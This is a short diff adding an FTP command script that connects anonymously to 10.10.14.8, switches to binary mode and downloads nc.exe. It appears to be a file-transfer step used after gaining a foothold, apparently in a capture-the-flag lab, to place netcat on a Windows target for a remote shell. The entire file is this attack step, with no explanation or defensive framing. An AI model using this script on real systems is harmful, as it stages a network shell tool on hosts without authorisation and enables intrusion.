@@ -1,0 +1,6 @@
+open 10.10.14.8
+anonymous
+password
+binary
+get nc.exe
+bye
